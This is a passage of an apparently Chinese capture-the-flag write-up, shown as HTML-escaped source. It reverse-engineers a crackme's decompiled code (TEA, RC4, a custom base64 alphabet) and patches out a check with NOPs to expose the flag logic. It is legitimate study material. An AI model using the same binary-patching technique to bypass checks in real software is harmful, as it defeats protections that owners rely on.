        input_1 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v1102;
        v1095 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1100;
        v1078 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1095;
        v1072 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sum &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; input_1;
        v1069 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input_1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
        v1066 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1069;
        input_2 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v1062;
    }
    v1170[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input_1;
    v1170[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input_2;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;经过了一些手动处理，得到了上面的伪代码，显然就是TEA呗，第一关就这么过了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  v510 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Th1nkMyfr1end&amp;#34;&lt;/span&gt;;
  v507 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v18[&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {};
  v504 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;; i5&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; )
  {
    v17[i5] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i5;
    v18[i5] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v510[i5 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;];
  }

  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;; i5&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; )
  {
    v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18[i5];
    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v17[i5];
    v380 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v507;
    v371 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v380;
    v507 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v371 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;;
    v504 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v17[i5];
    v17[i5] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v17[v507];
    v17[v507] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v504;
  }


  v511 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;;
  v507 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  i5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; v511 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; i17; i17&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; )
  {
    i5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (i5 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;;           &lt;span style=&#34;color:#75715e&#34;&gt;// i = i + 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v17[i5];                  &lt;span style=&#34;color:#75715e&#34;&gt;// S[i]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v507 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v507) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;;      &lt;span style=&#34;color:#75715e&#34;&gt;// j = (j + S[i]) % 256
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v155 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v17[i5];
    v17[i5] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v17[v507];
    v17[v507] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v155;              &lt;span style=&#34;color:#75715e&#34;&gt;// S[i], S[j] = S[j], S[i]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v103 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v17[v507] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v17[i5];    &lt;span style=&#34;color:#75715e&#34;&gt;// S[i] + S[j]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    input[i17] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; v17[v103 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// data ^= S[(S[i] + S[j]) % 256]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;256的SBOX，且仅进行一次异或，果断RC4&lt;/p&gt;
&lt;p&gt;中间见到了这样的东西&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    v100 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v103
    v98 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v103 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; v120;
    v97 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v120;
    v96 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v97 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v98; &lt;span style=&#34;color:#75715e&#34;&gt;// 去除for循环后
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v506 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v100 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v96;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;$v103 - (v120 * (v103 / v120)) = v103 - (v103 - (v103 % v120))$，显然就是取模运算了&lt;/p&gt;
&lt;p&gt;随后是这个&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  v1013 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)input;
  v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v20;
  v1011 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(input);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i31 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i31 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i31 )
  {
    v978 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;823&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// 12345
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v948 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i31 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x114514&lt;/span&gt;;
    v18[i31] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v948 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; v978;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v1011 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; )
  {
    v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1013 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18[v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;];
    v1012 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18[(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (v1013[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (v1013[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f&lt;/span&gt;];
    v1012 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    v818 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (v1013[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f&lt;/span&gt;);
    v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v1013 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;;
    v804 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    v803 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    v802 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    v801 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18[v818 &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; v10 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
    v1012 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1013[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];

    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)v18[v11 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63&lt;/span&gt;];
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5;
    v1012 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    v1011 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;v1011 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// v1011 -= 3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v1013 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v1011 )
  {
    v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1013 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18[v12 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;];
    v1012&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v1011 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ) {
      v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1013;
      v640 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v16 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18[v640];
      v1012&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
      v586 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18[v586];
      v1012&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
      v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1013;
      v720 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v13 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
      v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v1013 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18[v720 &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; v14 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;];
      v1012&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
      v15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v1013 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
      v666 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v15 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v18[v666];
      v1012&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    }
    v564 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
    v548 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
    v534 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v548;
    v533 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v564;
    v532 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v1012 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)v18[v532];
    v1012&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第一个for循环是v18的生成，后面是个base64换表换成v18的&lt;/p&gt;
&lt;p&gt;根据字符串提示，后面就是check了，但这部分好像反编译不出来&lt;/p&gt;
&lt;p&gt;看了下汇编（patch前的忘记存了）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;07FF7D3CE9906                 lea     rcx, aWowThatIsAmazi ; &amp;quot;Wow.....That is amazing.......You actua&amp;quot;...
.text:00007FF7D3CE990D                 call    print
.text:00007FF7D3CE9912                 mov     [rbp+2A80h+var_14], 0
.text:00007FF7D3CE991C                 jmp     loc_7FF7D3CE9A16

.text:00007FF7D3CE9A16 loc_7FF7D3CE9A16:                       ; CODE XREF: sub_7FF7D3CE15E2+833A↑j
.text:00007FF7D3CE9A16                 nop
.text:00007FF7D3CE9A17                 nop
.text:00007FF7D3CE9A18                 nop
.text:00007FF7D3CE9A19                 nop
.text:00007FF7D3CE9A1A                 nop
.text:00007FF7D3CE9A1B                 nop
.text:00007FF7D3CE9A1C                 nop
.text:00007FF7D3CE9A1D                 nop
.text:00007FF7D3CE9A1E                 nop
.text:00007FF7D3CE9A1F                 nop
.text:00007FF7D3CE9A20                 nop
.text:00007FF7D3CE9A21                 nop
.text:00007FF7D3CE9A22                 nop
.text:00007FF7D3CE9A23                 nop
.text:00007FF7D3CE9A24                 nop
.text:00007FF7D3CE9A25                 nop
.text:00007FF7D3CE9A26                 lea     rcx, aOkYouWinTheRes ; &amp;quot;Ok you win. The result will be shown la&amp;quot;...
.text:00007FF7D3CE9A2D                 call    print
.text:00007FF7D3CE9A32                 mov     [rbp+2A80h+var_18], 0
.text:00007FF7D3CE9A3C                 jmp     loc_7FF7D3CE9B1A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;本来有一个判断和一个跳转，直接patch掉，中间应该是一些浪费时间的东西，再重新反编译一下，就能看到check部分了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  v1272 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
  {
    v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v1272 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; v37 )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
